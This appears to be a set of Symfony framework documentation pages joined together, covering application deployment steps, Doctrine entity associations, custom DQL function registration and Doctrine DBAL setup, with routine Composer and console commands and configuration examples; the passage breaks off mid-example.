.. _`HTTP Host header attacks`: https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
.. _`nginx realip module`: https://nginx.org/en/docs/http/ngx_http_realip_module.html
.. _`Microsoft Azure`: https://en.wikipedia.org/wiki/Microsoft_Azure
.. _how-to-deploy-a-symfony2-application:

How to Deploy a Symfony Application
===================================

Deploying a Symfony application can be a complex and varied task depending on
the setup and the requirements of your application. This article is not a
step-by-step guide, but is a general list of the most common requirements and
ideas for deployment.

.. _symfony2-deployment-basics:

Symfony Deployment Basics
-------------------------

The typical steps taken while deploying a Symfony application include:

#. Upload your code to the production server;
#. Install your vendor dependencies (typically done via Composer and may be done
   before uploading);
#. Running database migrations or similar tasks to update any changed data structures;
#. Clearing (and optionally, warming up) your cache.

A deployment may also include other tasks, such as:

* Tagging a particular version of your code as a release in your source control
  repository;
* Creating a temporary staging area to build your updated setup "offline";
* Running any tests available to ensure code and/or server stability;
* Removal of any unnecessary files from the ``public/`` directory to keep your
  production environment clean;
* Clearing of external cache systems (like `Memcached`_ or `Redis`_).

How to Deploy a Symfony Application
-----------------------------------

There are several ways you can deploy a Symfony application. Start with a few
basic deployment strategies and build up from there.

Basic File Transfer
~~~~~~~~~~~~~~~~~~~

The most basic way of deploying an application is copying the files manually
via FTP/SCP (or similar method). This has its disadvantages as you lack control
over the system as the upgrade progresses. This method also requires you
to take some manual steps after transferring the files (see `Common Deployment Tasks`_).

Using Source Control
~~~~~~~~~~~~~~~~~~~~

If you're using source control (e.g. Git or SVN), you can simplify by having
your live installation also be a copy of your repository. When you're ready to
upgrade, fetch the latest updates from your source control
system. When using Git, a common approach is to create a tag for each release
and check out the appropriate tag on deployment (see `Git Tagging`_).

This makes updating your files *easier*, but you still need to worry about
manually taking other steps (see `Common Deployment Tasks`_).

Using Platforms as a Service
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Using a Platform as a Service (PaaS) can be a great way to deploy your Symfony
app quickly. There are many PaaS, but we recommend `Platform.sh`_ as it
provides a dedicated Symfony integration and helps fund the Symfony development.

Using Build Scripts and other Tools
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

There are also tools to help ease the pain of deployment. Some of them have been
specifically tailored to the requirements of Symfony.

`Deployer`_
    This is another native PHP rewrite of Capistrano, with some ready recipes for
    Symfony.

`Ansistrano`_
    An Ansible role that allows you to configure a powerful deploy via YAML files.

`Magallanes`_
    This Capistrano-like deployment tool is built in PHP, and may be easier
    for PHP developers to extend for their needs.

`Fabric`_
    This Python-based library provides a basic suite of operations for executing
    local or remote shell commands and uploading/downloading files.

`Capistrano`_ with `Symfony plugin`_
    `Capistrano`_ is a remote server automation and deployment tool written in Ruby.
    `Symfony plugin`_ is a plugin to ease Symfony related tasks, inspired by `Capifony`_
    (which works only with Capistrano 2).

.. _common-post-deployment-tasks:

Common Deployment Tasks
-----------------------

Before and after deploying your actual source code, there are a number of common
things you'll need to do:

A) Check Requirements
~~~~~~~~~~~~~~~~~~~~~

There are some :ref:`technical requirements for running Symfony applications <symfony-tech-requirements>`.
In your development machine, the recommended way to check these requirements is
to use `Symfony CLI`_. However, in your production server you might prefer to
not install the Symfony CLI tool. In those cases, install this other package in
your application:

.. code-block:: terminal

    $ composer require symfony/requirements-checker

Then, make sure that the checker is included in your Composer scripts:

.. code-block:: json

    {
        "...": "...",

        "scripts": {
            "auto-scripts": {
                "vendor/bin/requirements-checker": "php-script",
                "...": "..."
            },

            "...": "..."
        }
    }

.. _b-configure-your-app-config-parameters-yml-file:

B) Configure your Environment Variables
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Most Symfony applications read their configuration from environment variables.
While developing locally, you'll usually store these in ``.env`` and ``.env.local``
(for local overrides). On production, you have two options:

1. Create "real" environment variables. How you set environment variables, depends
   on your setup: they can be set at the command line, in your Nginx configuration,
   or via other methods provided by your hosting service;

2. Or, create a ``.env.local`` file like your local development.

There is no significant advantage to either of the two options: use whatever is
most natural in your hosting environment.

.. tip::

    You might not want your application to process the ``.env.*`` files on
    every request. You can generate an optimized ``.env.local.php`` which
    overrides all other configuration files:

    .. code-block:: terminal

        $ composer dump-env prod

    The generated file will contain all the configuration stored in ``.env``. If you
    want to rely only on environment variables, generate one without any values using:

    .. code-block:: terminal

        $ composer dump-env prod --empty

    If you don't have Composer installed on the production server, use instead
    :ref:`the dotenv:dump Symfony command <configuration-env-var-in-prod>`.

C) Install/Update your Vendors
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Your vendors can be updated before transferring your source code (i.e.
update the ``vendor/`` directory, then transfer that with your source
code) or afterwards on the server. Either way, update your vendors
as you normally do:

.. code-block:: terminal

    $ composer install --no-dev --optimize-autoloader

.. tip::

    The ``--optimize-autoloader`` flag improves Composer's autoloader performance
    significantly by building a "class map". The ``--no-dev`` flag ensures that
    development packages are not installed in the production environment.

.. caution::

    If you get a "class not found" error during this step, you may need to
    run ``export APP_ENV=prod`` (or ``export SYMFONY_ENV=prod`` if you're not
    using :ref:`Symfony Flex <symfony-flex>`) before running this command so
    that the ``post-install-cmd`` scripts run in the ``prod`` environment.

D) Clear your Symfony Cache
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Make sure you clear and warm-up your Symfony cache:

.. code-block:: terminal

    $ APP_ENV=prod APP_DEBUG=0 php bin/console cache:clear

E) Other Things!
~~~~~~~~~~~~~~~~

There may be lots of other things that you need to do, depending on your
setup:

* Running any database migrations
* Clearing your APCu cache
* Add/edit CRON jobs
* Restarting your workers
* :ref:`Building and minifying your assets <how-do-i-deploy-my-encore-assets>` with Webpack Encore
* :ref:`Compile your assets <asset-mapper-deployment>` if you're using the AssetMapper component
* Pushing assets to a CDN
* On a shared hosting platform using the Apache web server, you may need to
  install the `symfony/apache-pack`_ package
* etc.

Application Lifecycle: Continuous Integration, QA, etc.
-------------------------------------------------------

While this article covers the technical details of deploying, the full lifecycle
of taking code from development up to production may have more steps:
deploying to staging, QA (Quality Assurance), running tests, etc.

The use of staging, testing, QA, continuous integration, database migrations
and the capability to roll back in case of failure are all strongly advised. There
are simple and more complex tools and one can make the deployment as easy
(or sophisticated) as your environment requires.

Don't forget that deploying your application also involves updating any dependency
(typically via Composer), migrating your database, clearing your cache and
other potential things like pushing assets to a CDN (see `Common Deployment Tasks`_).

Troubleshooting
---------------

Deployments not Using the ``composer.json`` File
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The :ref:`project root directory <configuration-kernel-project-directory>`
(whose value is used via the ``kernel.project_dir`` parameter and the
:method:`Symfony\\Component\\HttpKernel\\Kernel::getProjectDir` method) is
calculated automatically by Symfony as the directory where the main
``composer.json`` file is stored.

In deployments not using the ``composer.json`` file, you'll need to override the
:method:`Symfony\\Component\\HttpKernel\\Kernel::getProjectDir` method
:ref:`as explained in this section <configuration-kernel-project-directory>`.

Learn More
----------

.. toctree::
    :maxdepth: 1

    deployment/proxies

.. _`Capifony`: https://github.com/everzet/capifony
.. _`Capistrano`: https://capistranorb.com/
.. _`Fabric`: https://www.fabfile.org/
.. _`Ansistrano`: https://ansistrano.com/
.. _`Magallanes`: https://github.com/andres-montanez/Magallanes
.. _`Memcached`: https://memcached.org/
.. _`Redis`: https://redis.io/
.. _`Symfony plugin`: https://github.com/capistrano/symfony/
.. _`Deployer`: https://deployer.org/
.. _`Git Tagging`: https://git-scm.com/book/en/v2/Git-Basics-Tagging
.. _`Platform.sh`: https://symfony.com/cloud
.. _`Symfony CLI`: https://symfony.com/download
.. _`symfony/apache-pack`: https://packagist.org/packages/symfony/apache-pack
How to Work with Doctrine Associations / Relations
==================================================

.. admonition:: Screencast
    :class: screencast

    Do you prefer video tutorials? Check out the `Mastering Doctrine Relations`_
    screencast series.

There are **two** main relationship/association types:

``ManyToOne`` / ``OneToMany``
    The most common relationship, mapped in the database with a foreign
    key column (e.g. a ``category_id`` column on the ``product`` table). This is
    actually only *one* association type, but seen from the two different *sides*
    of the relation.

``ManyToMany``
    Uses a join table and is needed when both sides of the relationship can have
    many of the other side (e.g. "students" and "classes": each student is in many
    classes, and each class has many students).

First, you need to determine which relationship to use. If both sides of the relation
will contain many of the other side (e.g. "students" and "classes"), you need a
``ManyToMany`` relation. Otherwise, you likely need a ``ManyToOne``.

.. tip::

    There is also a OneToOne relationship (e.g. one User has one Profile and vice
    versa). In practice, using this is similar to ``ManyToOne``.

The ManyToOne / OneToMany Association
-------------------------------------

Suppose that each product in your application belongs to exactly one category.
In this case, you'll need a ``Category`` class, and a way to relate a
``Product`` object to a ``Category`` object.

Start by creating a ``Category`` entity with a ``name`` field:

.. code-block:: bash

    $ php bin/console make:entity Category

    New property name (press <return> to stop adding fields):
    > name

    Field type (enter ? to see all types) [string]:
    > string

    Field length [255]:
    > 255

    Can this field be null in the database (nullable) (yes/no) [no]:
    > no

    New property name (press <return> to stop adding fields):
    >
    (press enter again to finish)

This will generate your new entity class::

    // src/Entity/Category.php
    namespace App\Entity;

    // ...

    #[ORM\Entity(repositoryClass: CategoryRepository::class)]
    class Category
    {
        #[ORM\Id]
        #[ORM\GeneratedValue]
        #[ORM\Column]
        private $id;

        #[ORM\Column]
        private string $name;

        // ... getters and setters
    }

.. tip::

    Starting in `MakerBundle`_: v1.57.0 - You can pass either ``--with-uuid`` or
    ``--with-ulid`` to ``make:entity``. Leveraging Symfony's :doc:`Uid Component </components/uid>`,
    this generates an entity with the ``id`` type as :ref:`Uuid <uuid>`
    or :ref:`Ulid <ulid>` instead of ``int``.

Mapping the ManyToOne Relationship
----------------------------------

In this example, each category can be associated with *many* products. But,
each product can be associated with only *one* category. This relationship
can be summarized as: *many* products to *one* category (or equivalently,
*one* category to *many* products).

From the perspective of the ``Product`` entity, this is a many-to-one relationship.
From the perspective of the ``Category`` entity, this is a one-to-many relationship.

To map this, first create a ``category`` property on the ``Product`` class with
the ``ManyToOne`` attribute. You can do this by hand, or by using the ``make:entity``
command, which will ask you several questions about your relationship. If you're
not sure of the answer, don't worry! You can always change the settings later:

.. code-block:: bash

    $ php bin/console make:entity

    Class name of the entity to create or update (e.g. BraveChef):
    > Product

    New property name (press <return> to stop adding fields):
    > category

    Field type (enter ? to see all types) [string]:
    > relation

    What class should this entity be related to?:
    > Category

    Relation type? [ManyToOne, OneToMany, ManyToMany, OneToOne]:
    > ManyToOne

    Is the Product.category property allowed to be null (nullable)? (yes/no) [yes]:
    > no

    Do you want to add a new property to Category so that you can access/update
    Product objects from it - e.g. $category->getProducts()? (yes/no) [yes]:
    > yes

    New field name inside Category [products]:
    > products

    Do you want to automatically delete orphaned App\Entity\Product objects
    (orphanRemoval)? (yes/no) [no]:
    > no

    New property name (press <return> to stop adding fields):
    >
    (press enter again to finish)

This made changes to *two* entities. First, it added a new ``category`` property to
the ``Product`` entity (and getter & setter methods):

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/Product.php
        namespace App\Entity;

        // ...
        class Product
        {
            // ...

            #[ORM\ManyToOne(targetEntity: Category::class, inversedBy: 'products')]
            private Category $category;

            public function getCategory(): ?Category
            {
                return $this->category;
            }

            public function setCategory(?Category $category): self
            {
                $this->category = $category;

                return $this;
            }
        }

    .. code-block:: yaml

        # src/Resources/config/doctrine/Product.orm.yml
        App\Entity\Product:
            type: entity
            # ...
            manyToOne:
                category:
                    targetEntity: App\Entity\Category
                    inversedBy: products
                    joinColumn:
                        nullable: false

    .. code-block:: xml

        <!-- src/Resources/config/doctrine/Product.orm.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <doctrine-mapping xmlns="http://doctrine-project.org/schemas/orm/doctrine-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://doctrine-project.org/schemas/orm/doctrine-mapping
                https://doctrine-project.org/schemas/orm/doctrine-mapping.xsd">

            <entity name="App\Entity\Product">
                <!-- ... -->
                <many-to-one
                    field="category"
                    target-entity="App\Entity\Category"
                    inversed-by="products">
                    <join-column nullable="false"/>
                </many-to-one>
            </entity>
        </doctrine-mapping>

This ``ManyToOne`` mapping is required. It tells Doctrine to use the ``category_id``
column on the ``product`` table to relate each record in that table with
a record in the ``category`` table.

Next, since *one* ``Category`` object will relate to *many* ``Product`` objects,
the ``make:entity`` command *also* added a ``products`` property to the ``Category``
class that will hold these objects:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/Category.php
        namespace App\Entity;

        // ...
        use Doctrine\Common\Collections\ArrayCollection;
        use Doctrine\Common\Collections\Collection;

        class Category
        {
            // ...

            #[ORM\OneToMany(targetEntity: Product::class, mappedBy: 'category')]
            private Collection $products;

            public function __construct()
            {
                $this->products = new ArrayCollection();
            }

            /**
             * @return Collection<int, Product>
             */
            public function getProducts(): Collection
            {
                return $this->products;
            }

            // addProduct() and removeProduct() were also added
        }

    .. code-block:: yaml

        # src/Resources/config/doctrine/Category.orm.yml
        App\Entity\Category:
            type: entity
            # ...
            oneToMany:
                products:
                    targetEntity: App\Entity\Product
                    mappedBy: category
        # Don't forget to initialize the collection in
        # the __construct() method of the entity

    .. code-block:: xml

        <!-- src/Resources/config/doctrine/Category.orm.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <doctrine-mapping xmlns="http://doctrine-project.org/schemas/orm/doctrine-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://doctrine-project.org/schemas/orm/doctrine-mapping
                https://doctrine-project.org/schemas/orm/doctrine-mapping.xsd">

            <entity name="App\Entity\Category">
                <!-- ... -->
                <one-to-many
                    field="products"
                    target-entity="App\Entity\Product"
                    mapped-by="category"/>

                <!--
                    don't forget to init the collection in
                    the __construct() method of the entity
                -->
            </entity>
        </doctrine-mapping>

The ``ManyToOne`` mapping shown earlier is *required*, But, this ``OneToMany``
is optional: only add it *if* you want to be able to access the products that are
related to a category (this is one of the questions ``make:entity`` asks you). In
this example, it *will* be useful to be able to call ``$category->getProducts()``.
If you don't want it, then you also don't need the ``inversedBy`` or ``mappedBy``
config.

.. sidebar:: What is the ArrayCollection Stuff?

    The code inside ``__construct()`` is important: The ``$products`` property must
    be a collection object that implements Doctrine's ``Collection`` interface.
    In this case, an `ArrayCollection`_ object is used. This looks and acts almost
    *exactly* like an array, but has some added flexibility. Just imagine that
    it is an ``array`` and you'll be in good shape.

Your database is set up! Now, run the migrations like normal:

.. code-block:: terminal

    $ php bin/console doctrine:migrations:diff
    $ php bin/console doctrine:migrations:migrate

Thanks to the relationship, this creates a ``category_id`` foreign key column on
the ``product`` table. Doctrine is ready to persist our relationship!

Saving Related Entities
-----------------------

Now you can see this new code in action! Imagine you're inside a controller::

    // src/Controller/ProductController.php
    namespace App\Controller;

    // ...
    use App\Entity\Category;
    use App\Entity\Product;
    use Doctrine\ORM\EntityManagerInterface;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class ProductController extends AbstractController
    {
        #[Route('/product', name: 'product')]
        public function index(EntityManagerInterface $entityManager): Response
        {
            $category = new Category();
            $category->setName('Computer Peripherals');

            $product = new Product();
            $product->setName('Keyboard');
            $product->setPrice(19.99);
            $product->setDescription('Ergonomic and stylish!');

            // relates this product to the category
            $product->setCategory($category);

            $entityManager->persist($category);
            $entityManager->persist($product);
            $entityManager->flush();

            return new Response(
                'Saved new product with id: '.$product->getId()
                .' and new category with id: '.$category->getId()
            );
        }
    }

When you go to ``/product``, a single row is added to both the ``category`` and
``product`` tables. The ``product.category_id`` column for the new product is set
to whatever the ``id`` is of the new category. Doctrine manages the persistence of this
relationship for you:

.. raw:: html

    <object data="../_images/doctrine/mapping_relations.svg" type="image/svg+xml"
        alt="Doctrine mapping associated Product and Category entities to a product and category database table"
    ></object>

If you're new to an ORM, this is the *hardest* concept: you need to stop thinking
about your database, and instead *only* think about your objects. Instead of setting
the category's integer id onto ``Product``, you set the entire ``Category`` *object*.
Doctrine takes care of the rest when saving.

.. sidebar:: Updating the Relationship from the Inverse Side

    Could you also call ``$category->addProduct()`` to change the relationship? Yes,
    but, only because the ``make:entity`` command helped us. For more details,
    see: `associations-inverse-side`_.

Fetching Related Objects
------------------------

When you need to fetch associated objects, your workflow looks like it did
before. First, fetch a ``$product`` object and then access its related
``Category`` object::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use App\Entity\Product;
    // ...

    class ProductController extends AbstractController
    {
        public function show(ProductRepository $productRepository, int $id): Response
        {
            $product = $productRepository->find($id);
            // ...

            $categoryName = $product->getCategory()->getName();

            // ...
        }
    }

In this example, you first query for a ``Product`` object based on the product's
``id``. This issues a query to fetch *only* the product data and hydrates the
``$product``. Later, when you call ``$product->getCategory()->getName()``,
Doctrine silently makes a second query to find the ``Category`` that's related
to this ``Product``. It prepares the ``$category`` object and returns it to
you.

.. raw:: html

    <object data="../_images/doctrine/mapping_relations_proxy.svg" type="image/svg+xml"
        alt="Doctrine only querying Category data when needed"
    ></object>

What's important is the fact that you have access to the product's related
category, but the category data isn't actually retrieved until you ask for
the category (i.e. it's "lazily loaded").

Because we mapped the optional ``OneToMany`` side, you can also query in the other
direction::

    // src/Controller/ProductController.php

    // ...
    class ProductController extends AbstractController
    {
        public function showProducts(CategoryRepository $categoryRepository, int $id): Response
        {
            $category = $categoryRepository->find($id);

            $products = $category->getProducts();

            // ...
        }
    }

In this case, the same things occur: you first query for a single ``Category``
object. Then, only when (and if) you access the products, Doctrine makes a second
query to retrieve the related ``Product`` objects. This extra query can be avoided
by adding JOINs.

.. sidebar:: Relationships and Proxy Classes

    This "lazy loading" is possible because, when necessary, Doctrine returns
    a "proxy" object in place of the true object. Look again at the above
    example::

        $product = $productRepository->find($id);

        $category = $product->getCategory();

        // prints "Proxies\AppEntityCategoryProxy"
        dump(get_class($category));
        die();

    This proxy object extends the true ``Category`` object, and looks and
    acts exactly like it. The difference is that, by using a proxy object,
    Doctrine can delay querying for the real ``Category`` data until you
    actually need that data (e.g. until you call ``$category->getName()``).

    The proxy classes are generated by Doctrine and stored in the cache directory.
    You'll probably never even notice that your ``$category`` object is actually
    a proxy object.

    In the next section, when you retrieve the product and category data
    all at once (via a *join*), Doctrine will return the *true* ``Category``
    object, since nothing needs to be lazily loaded.

.. _doctrine-associations-join-query:

Joining Related Records
-----------------------

In the examples above, two queries were made - one for the original object
(e.g. a ``Category``) and one for the related object(s) (e.g. the ``Product``
objects).

.. tip::

    Remember that you can see all of the queries made during a request via
    the web debug toolbar.

If you know up front that you'll need to access both objects, you
can avoid the second query by issuing a join in the original query. Add the
following method to the ``ProductRepository`` class::

    // src/Repository/ProductRepository.php

    // ...
    class ProductRepository extends ServiceEntityRepository
    {
        public function findOneByIdJoinedToCategory(int $productId): ?Product
        {
            $entityManager = $this->getEntityManager();

            $query = $entityManager->createQuery(
                'SELECT p, c
                FROM App\Entity\Product p
                INNER JOIN p.category c
                WHERE p.id = :id'
            )->setParameter('id', $productId);

            return $query->getOneOrNullResult();
        }
    }

This will *still* return an array of ``Product`` objects. But now, when you call
``$product->getCategory()`` and use that data, no second query is made.

Now, you can use this method in your controller to query for a ``Product``
object and its related ``Category`` in one query::

    // src/Controller/ProductController.php

    // ...
    class ProductController extends AbstractController
    {
        public function show(ProductRepository $productRepository, int $id): Response
        {
            $product = $productRepository->findOneByIdJoinedToCategory($id);

            $category = $product->getCategory();

            // ...
        }
    }

.. _associations-inverse-side:

Setting Information from the Inverse Side
-----------------------------------------

So far, you've updated the relationship by calling ``$product->setCategory($category)``.
This is no accident! Each relationship has two sides: in this example, ``Product.category``
is the *owning* side and ``Category.products`` is the *inverse* side.

To update a relationship in the database, you *must* set the relationship on the
*owning* side. The owning side is always where the ``ManyToOne`` mapping is set
(for a ``ManyToMany`` relation, you can choose which side is the owning side).

Does this mean it's not possible to call ``$category->addProduct()`` or
``$category->removeProduct()`` to update the database? Actually, it *is* possible,
thanks to some clever code that the ``make:entity`` command generated::

    // src/Entity/Category.php

    // ...
    class Category
    {
        // ...

        public function addProduct(Product $product): self
        {
            if (!$this->products->contains($product)) {
                $this->products[] = $product;
                $product->setCategory($this);
            }

            return $this;
        }
    }

The *key* is ``$product->setCategory($this)``, which sets the *owning* side. Thanks,
to this, when you save, the relationship *will* update in the database.

What about *removing* a ``Product`` from a ``Category``? The ``make:entity`` command
also generated a ``removeProduct()`` method::

    // src/Entity/Category.php
    namespace App\Entity;

    // ...
    class Category
    {
        // ...

        public function removeProduct(Product $product): self
        {
            if ($this->products->contains($product)) {
                $this->products->removeElement($product);
                // set the owning side to null (unless already changed)
                if ($product->getCategory() === $this) {
                    $product->setCategory(null);
                }
            }

            return $this;
        }
    }

Thanks to this, if you call ``$category->removeProduct($product)``, the ``category_id``
on that ``Product`` will be set to ``null`` in the database.

.. warning::

    Please be aware that the inverse side could be associated with a large amount of records.
    I.e. there could be a large amount of products with the same category.
    In this case ``$this->products->contains($product)`` could lead to unwanted database
    requests and very high memory consumption with the risk of hard to debug "Out of memory" errors.

    So make sure if you need an inverse side and check if the generated code could lead to such issues.

But, instead of setting the ``category_id`` to null, what if you want the ``Product``
to be *deleted* if it becomes "orphaned" (i.e. without a ``Category``)? To choose
that behavior, use the `orphanRemoval`_ option inside ``Category``:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/Category.php

        // ...

        #[ORM\OneToMany(targetEntity: Product::class, mappedBy: 'category', orphanRemoval: true)]
        private array $products;

Thanks to this, if the ``Product`` is removed from the ``Category``, it will be
removed from the database entirely.

More Information on Associations
--------------------------------

This section has been an introduction to one common type of entity relationship,
the one-to-many relationship. For more advanced details and examples of how
to use other types of relations (e.g. one-to-one, many-to-many), see
Doctrine's `Association Mapping Documentation`_.

.. note::

    If you're using attributes, you'll need to prepend all attributes with
    ``#[ORM\]`` (e.g. ``#[ORM\OneToMany]``), which is not reflected in Doctrine's
    documentation.

.. _`Association Mapping Documentation`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/association-mapping.html
.. _`orphanRemoval`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/working-with-associations.html#orphan-removal
.. _`Mastering Doctrine Relations`: https://symfonycasts.com/screencast/doctrine-relations
.. _`ArrayCollection`: https://www.doctrine-project.org/projects/doctrine-collections/en/1.6/index.html
.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html
How to Register custom DQL Functions
====================================

Doctrine allows you to specify custom DQL functions. For more information
on this topic, read Doctrine's cookbook article `DQL User Defined Functions`_.

In Symfony, you can register your custom DQL functions as follows:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/doctrine.yaml
        doctrine:
            orm:
                # ...
                dql:
                    string_functions:
                        test_string: App\DQL\StringFunction
                        second_string: App\DQL\SecondStringFunction
                    numeric_functions:
                        test_numeric: App\DQL\NumericFunction
                    datetime_functions:
                        test_datetime: App\DQL\DatetimeFunction

    .. code-block:: xml

        <!-- config/packages/doctrine.xml -->
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:doctrine="http://symfony.com/schema/dic/doctrine"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/doctrine
                https://symfony.com/schema/dic/doctrine/doctrine-1.0.xsd">

            <doctrine:config>
                <doctrine:orm>
                    <!-- ... -->
                    <doctrine:dql>
                        <doctrine:string-function name="test_string">App\DQL\StringFunction</doctrine:string-function>
                        <doctrine:string-function name="second_string">App\DQL\SecondStringFunction</doctrine:string-function>
                        <doctrine:numeric-function name="test_numeric">App\DQL\NumericFunction</doctrine:numeric-function>
                        <doctrine:datetime-function name="test_datetime">App\DQL\DatetimeFunction</doctrine:datetime-function>
                    </doctrine:dql>
                </doctrine:orm>
            </doctrine:config>
        </container>

    .. code-block:: php

        // config/packages/doctrine.php
        use App\DQL\DatetimeFunction;
        use App\DQL\NumericFunction;
        use App\DQL\SecondStringFunction;
        use App\DQL\StringFunction;
        use Symfony\Config\DoctrineConfig;

        return static function (DoctrineConfig $doctrine): void {
            $defaultDql = $doctrine->orm()
                ->entityManager('default')
                    // ...
                    ->dql();

            $defaultDql->stringFunction('test_string', StringFunction::class);
            $defaultDql->stringFunction('second_string', SecondStringFunction::class);
            $defaultDql->numericFunction('test_numeric', NumericFunction::class);
            $defaultDql->datetimeFunction('test_datetime', DatetimeFunction::class);
        };

.. note::

    In case the ``entity_managers`` were named explicitly, configuring the functions with the
    ORM directly will trigger the exception ``Unrecognized option "dql" under "doctrine.orm"``.
    The ``dql`` configuration block must be defined under the named entity manager.

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/doctrine.yaml
            doctrine:
                orm:
                    # ...
                    entity_managers:
                        example_manager:
                            # Place your functions here
                            dql:
                                datetime_functions:
                                    test_datetime: App\DQL\DatetimeFunction

        .. code-block:: xml

            <!-- config/packages/doctrine.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:doctrine="http://symfony.com/schema/dic/doctrine"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/doctrine
                    https://symfony.com/schema/dic/doctrine/doctrine-1.0.xsd">

                <doctrine:config>
                    <doctrine:orm>
                        <!-- ... -->

                        <doctrine:entity-manager name="example_manager">
                            <!-- place your functions here -->
                            <doctrine:dql>
                                <doctrine:datetime-function name="test_datetime">
                                    App\DQL\DatetimeFunction
                                </doctrine:datetime-function>
                            </doctrine:dql>
                        </doctrine:entity-manager>
                    </doctrine:orm>
                </doctrine:config>
            </container>

        .. code-block:: php

            // config/packages/doctrine.php
            use App\DQL\DatetimeFunction;
            use Symfony\Config\DoctrineConfig;

            return static function (DoctrineConfig $doctrine): void {
                $doctrine->orm()
                    // ...
                    ->entityManager('example_manager')
                        // place your functions here
                        ->dql()
                            ->datetimeFunction('test_datetime', DatetimeFunction::class);
            };

.. caution::

    DQL functions are instantiated by Doctrine outside of the Symfony
    :doc:`service container </service_container>` so you can't inject services
    or parameters into a custom DQL function.

.. _`DQL User Defined Functions`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/cookbook/dql-user-defined-functions.html
How to Use Doctrine DBAL
========================

.. note::

    This article is about the Doctrine DBAL. Typically, you'll work with
    the higher level Doctrine ORM layer, which uses the DBAL behind
    the scenes to actually communicate with the database. To read more about
    the Doctrine ORM, see ":doc:`/doctrine`".

The `Doctrine`_ Database Abstraction Layer (DBAL) is an abstraction layer that
sits on top of `PDO`_ and offers an intuitive and flexible API for communicating
with the most popular relational databases. The DBAL library allows you to write
queries independently of your ORM models, e.g. for building reports or direct
data manipulations.

.. tip::

    Read the official Doctrine `DBAL Documentation`_ to learn all the details
    and capabilities of Doctrine's DBAL library.

First, install the Doctrine ``orm`` :ref:`Symfony pack <symfony-packs>`:

.. code-block:: terminal

    $ composer require symfony/orm-pack

Then configure the ``DATABASE_URL`` environment variable in ``.env``:

.. code-block:: text

    # .env (or override DATABASE_URL in .env.local to avoid committing your changes)

    # customize this line!
    DATABASE_URL="mysql://db_user:db_password@127.0.0.1:3306/db_name?serverVersion=5.7"

Further things can be configured in ``config/packages/doctrine.yaml`` - see
:ref:`reference-dbal-configuration`. Remove the ``orm`` key in that file
if you *don't* want to use the Doctrine ORM.

You can then access the Doctrine DBAL connection by autowiring the ``Connection``
object::

    // src/Controller/UserController.php
    namespace App\Controller;

    use Doctrine\DBAL\Connection;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;

    class UserController extends AbstractController
    {
        public function index(Connection $connection): Response
        {
            $users = $connection->fetchAllAssociative('SELECT * FROM users');

            // ...
        }
    }

This will pass you the ``database_connection`` service.

Registering custom Mapping Types
--------------------------------

You can register custom mapping types through Symfony's configuration. They
will be added to all configured connections. For more information on custom
mapping types, read Doctrine's `Custom Mapping Types`_ section of their documentation.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/doctrine.yaml
        doctrine:
            dbal:
                types:
                    custom_first:  App\Type\CustomFirst
                    custom_second: App\Type\CustomSecond

    .. code-block:: xml

        <!-- config/packages/doctrine.xml -->
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:doctrine="http://symfony.com/schema/dic/doctrine"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/doctrine
                https://symfony.com/schema/dic/doctrine/doctrine-1.0.xsd">

            <doctrine:config>
                <doctrine:dbal>
                    <doctrine:type name="custom_first" class="App\Type\CustomFirst"/>
                    <doctrine:type name="custom_second" class="App\Type\CustomSecond"/>
                </doctrine:dbal>
            </doctrine:config>
        </container>

    .. code-block:: php

        // config/packages/doctrine.php
        use App\Type\CustomFirst;
        use App\Type\CustomSecond;
        use Symfony\Config\DoctrineConfig;

        return static function (DoctrineConfig $doctrine): void {
            $dbal = $doctrine->dbal();
            $dbal->type('custom_first')->class(CustomFirst::class);
            $dbal->type('custom_second')->class(CustomSecond::class);
        };

Registering custom Mapping Types in the SchemaTool
--------------------------------------------------

The SchemaTool is used to inspect the database to compare the schema. To
achieve this task, it needs to know which mapping type needs to be used
for each database type. Registering new ones can be done through the configuration.

Now, map the ENUM type (not supported by DBAL by default) to the ``string``
mapping type:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/doctrine.yaml
        doctrine:
            dbal:
                mapping_types:
                    enum: string

    .. code-block:: xml

        <!-- config/packages/doctrine.xml -->
